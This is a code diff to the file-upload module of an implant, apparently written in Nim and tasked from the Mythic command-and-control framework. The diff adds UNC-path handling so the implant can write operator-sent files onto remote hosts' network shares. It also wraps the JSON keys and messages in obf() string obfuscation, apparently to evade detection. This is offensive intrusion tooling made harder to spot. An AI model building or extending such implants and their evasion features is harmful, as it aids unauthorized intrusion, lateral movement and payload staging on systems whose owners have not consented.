@@ -1,4 +1,5 @@
-import json, os, base64
+import json, os, base64, strutils
+import ../utils/strenc
 
 const CHUNK_SIZE = 512000  # 512KB chunks
 
@@ -7,6 +8,7 @@ type
     file: string
     remote_path: string
     file_name: string
+    host: string  # Optional host for UNC paths
 
 proc executeUpload*(taskId: string, params: JsonNode): JsonNode =
   ## Upload a file from Mythic to the target system
@@ -14,36 +16,48 @@ proc executeUpload*(taskId: string, params: JsonNode): JsonNode =
   
   try:
     let args = to(params, UploadArgs)
-    let cwd = getCurrentDir()
-    let filePath = cwd / args.remote_path
+    
+    # Build UNC path if host is provided
+    var filePath: string
+    if args.host.len > 0:
+      # Remove leading/trailing backslashes from path
+      var cleanPath = args.remote_path.strip(chars = {'\\', '/'})
+      # Build UNC path: \\host\share
+      filePath = "\\\\" & args.host & "\\" & cleanPath
+    elif args.remote_path.startsWith("\\\\") or isAbsolute(args.remote_path):
+      # Already UNC or absolute path
+      filePath = args.remote_path
+    else:
+      # Relative path - join with current directory
+      filePath = getCurrentDir() / args.remote_path
     
     # Check if file already exists
     if fileExists(filePath):
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": "Remote path already exists: " & filePath
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): "error",
+        obf("user_output"): obf("Remote path already exists: ") & filePath
       }
     
     # Request first chunk
     return %*{
-      "upload": {
-        "chunk_size": CHUNK_SIZE,
-        "file_id": args.file,
-        "chunk_num": 1,
-        "full_path": filePath
+      obf("upload"): {
+        obf("chunk_size"): CHUNK_SIZE,
+        obf("file_id"): args.file,
+        obf("chunk_num"): 1,
+        obf("full_path"): filePath
       },
-      "task_id": taskId,
-      "user_output": "Uploading chunk 1\n"
+      obf("task_id"): taskId,
+      obf("user_output"): obf("Uploading chunk 1\n")
     }
     
   except Exception as e:
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "Error initiating upload: " & e.msg
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("Error initiating upload: ") & e.msg
     }
 
 proc processUploadChunk*(taskId: string, fileId: string, path: string, chunkNum: int, chunkData: string, totalChunks: int, isFirstChunk: bool): JsonNode =
@@ -51,8 +65,11 @@ proc processUploadChunk*(taskId: string, fileId: string, path: string, chunkNum:
   ## Appends to file and requests next chunk if needed
   
   try:
-    let cwd = getCurrentDir()
-    let filePath = cwd / path
+    # Handle UNC paths and absolute paths - don't join with cwd
+    let filePath = if path.startsWith("\\\\") or isAbsolute(path):
+      path
+    else:
+      getCurrentDir() / path
     
     # Decode the chunk
     let decodedData = decode(chunkData)
@@ -71,28 +88,28 @@ proc processUploadChunk*(taskId: string, fileId: string, path: string, chunkNum:
     if chunkNum < totalChunks:
       let nextChunk = chunkNum + 1
       return %*{
-        "upload": {
-          "chunk_size": CHUNK_SIZE,
-          "file_id": fileId,
-          "chunk_num": nextChunk,
-          "full_path": filePath
+        obf("upload"): {
+          obf("chunk_size"): CHUNK_SIZE,
+          obf("file_id"): fileId,
+          obf("chunk_num"): nextChunk,
+          obf("full_path"): filePath
         },
-        "task_id": taskId,
-        "user_output": "Uploading chunk " & $nextChunk & "/" & $totalChunks & "\n"
+        obf("task_id"): taskId,
+        obf("user_output"): obf("Uploading chunk ") & $nextChunk & "/" & $totalChunks & "\n"
       }
     else:
       # All chunks received, complete the task
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "success",
-        "user_output": "Uploaded '" & filePath & "'"
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): obf("success"),
+        obf("user_output"): obf("Uploaded '") & filePath & obf("'")
       }
     
   except Exception as e:
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "Error processing upload chunk " & $chunkNum & ": " & e.msg
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("Error processing upload chunk ") & $chunkNum & ": " & e.msg
     }
